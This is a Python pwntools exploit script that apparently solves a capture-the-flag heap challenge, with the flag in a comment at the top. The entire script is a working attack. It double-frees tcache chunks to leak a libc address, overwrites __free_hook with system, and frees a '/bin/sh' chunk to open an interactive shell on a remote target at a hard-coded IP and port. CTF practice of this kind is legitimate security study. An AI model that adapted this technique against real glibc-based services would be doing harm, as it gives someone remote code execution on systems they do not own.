#exploit for too lazy
#BSDCTF{Tcach3_1s_w4y_easi3r_than_f4stbins}
from pwn import *
import time
elf = ELF("./chall")
libc=elf.libc
context.binary=elf
#target=process([elf.path])
target=remote('13.233.104.112',1111)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(size,data="A"):
	sla(">> ",str(1))
	sla("Enter size >> ",str(size))
	sa("Enter data >> ",data)
	
def delete(index):
	sla(">> ",str(3))
	sa("Enter index >> ",str(index)+"\x00")

def leaks(index):
	sla(">> ",str(2))
	sa("Enter index >> ",str(index))
	target.recvuntil("You data:\n")
	leak=target.recvline().strip("\n")
	return leak

add(0x98)
add(0x30)
delete(1)
delete(1)
for i in range(8):
	delete(0)
libc_base=u64(leaks(0).ljust(8,"\x00"))-0x3ebca0
libc_free_hook=libc_base+libc.sym["__free_hook"]
libc_system=libc_base+libc.sym["system"]
print(hex(libc_base))
add(0x30,p64(libc_free_hook))
add(0x30,"/bin/sh\x00")
add(0x30,p64(libc_system))
delete(3)
target.interactive()
